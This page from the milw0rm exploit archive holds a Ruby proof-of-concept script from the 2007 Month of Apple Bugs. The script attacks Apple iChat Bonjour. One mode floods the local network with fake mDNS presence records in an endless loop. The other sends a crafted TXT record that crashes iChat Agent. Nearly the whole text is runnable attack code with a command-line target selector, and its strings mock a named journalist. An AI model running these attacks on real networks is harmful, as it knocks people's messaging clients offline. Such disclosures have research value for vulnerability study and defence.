<html><head><title>Apple iChat Bonjour 3.1.6.441 Multiple Denial of Service Exploit</title></head><pre>#!/usr/bin/ruby
# (c) 2006 Lance M. Havok &lt;lmh [at] info-pull.com&gt;
# All Rights Reserved.
# basic proof of concept for MOAB-29-01-2007
#

require 'digest/sha1'
require 'rubygems'
require 'net/dns/mdns-sd'

bugselected = (ARGV[0] || &quot;0&quot;).to_i
TMP_ARR     = []
DNSSD       = Net::DNS::MDNSSD

trap(&quot;INT&quot;) {
  puts &quot;++ Exiting...&quot;
  begin
    TMP_ARR.each do |o|
      o.stop
    end
  rescue
  end

  exit
}

#
# This method abuses a design weakness in iChat Bonjour services, allowing an user
# to conduct a denial of service attack against reachable clients by registering multiple
# (fake) _presence records.
#
def oh_gnoes_contact_dos(status_msg = &quot;ekoC stronS reztleS yrraL&quot;.reverse,
                         firstname  = 'Pwnies',
                         lastname   = 'Mgheetacek')
  
  available_status  = [ &quot;avail&quot;, &quot;away&quot; ]
  cur_status        = available_status[rand(available_status.size)]

  # the TXT keys (see http://www.xmpp.org/extensions/xep-0174.html)
  keyset = {  &quot;status&quot;    =&gt; cur_status,                                # - presence availability of the user
              &quot;msg&quot;       =&gt; status_msg,                                # - user's state
              &quot;vc&quot;        =&gt; &quot;CUAV!&quot;,                                   # - user's ability for A/V conferencing
              &quot;1st&quot;       =&gt; firstname,                                 # - first name of the user
              &quot;last&quot;      =&gt; lastname,                                  # - last name of the user
              &quot;txtvers&quot;   =&gt; &quot;1&quot;,                                       # - version of the TXT fields supported
              &quot;phsh&quot;      =&gt; Digest::SHA1.hexdigest(rand(0xffffffff).to_s),  # - fake SHA-1 hash of icon
              &quot;port.p2pj&quot; =&gt; &quot;1337&quot;                                     # - Port for link-local communications
                                                                        # (ignored).
            }

  count = 0
  while true
    rand_str = &quot;3891ecniSrevoLyaGeipmaerCterceSkecatPreztleSyrraL&quot;.reverse
    (rand_str.length-1).downto(1) do |c|
       n = rand(c) + 1
       rand_str[c], rand_str[n] = rand_str[n], rand_str[c]
    end
    
    puts &quot;++ Registering presence #{count}&quot;
    # TODO: add NULL record with user avatar icon (ex. Larry Seltzer's taliban bearded face)
    dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)
    #sleep 40
    TMP_ARR &lt;&lt; dos_handle
    count += 1
  end
end

#
# This method causes iChat Agent to raise an exception (SIGTRAP signal) with a crafted TXT key hash.
# Program received signal SIGTRAP, Trace/breakpoint trap.
# 0x9262050b in _NSRaiseError ()
#
def format_dos()
  keyset = {  &quot;status&quot; =&gt; &quot;avail&quot;, &quot;msg&quot; =&gt; &quot;I'm the Doomed eWook&quot;, &quot;vc&quot; =&gt; &quot;CUAV!&quot;, &quot;1st&quot; =&gt; &quot;Larry&quot;,
              &quot;last&quot; =&gt; &quot;Seltzer&quot;, &quot;txtvers&quot; =&gt; &quot;1&quot;, &quot;phsh&quot; =&gt; (&quot;\250&quot; * 40),
              &quot;port.p2pj&quot; =&gt; &quot;1337&quot; }
  
  rand_str = &quot;nabilaTAsAlufrewoPsIyrraL&quot;.reverse
  (rand_str.length-1).downto(1) do |c|
     n = rand(c) + 1
     rand_str[c], rand_str[n] = rand_str[n], rand_str[c]
  end
  
  dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)
  dos_handle.stop
end

#
# Proof of concept method selection below.
#

puts &quot;++ MOAB-29-01-2007: iChat Bonjour Fun&quot;
puts &quot;++ Selected target: #{bugselected}&quot;
case bugselected
  when 0
    format_dos()
  when 1
    if (ARGV[1] and ARGV[2] and ARGV[3])
      oh_gnoes_contact_dos(ARGV[1], ARGV[2], ARGV[3])
    else
      oh_gnoes_contact_dos()
    end
end

# milw0rm.com [2007-01-30]</pre></html>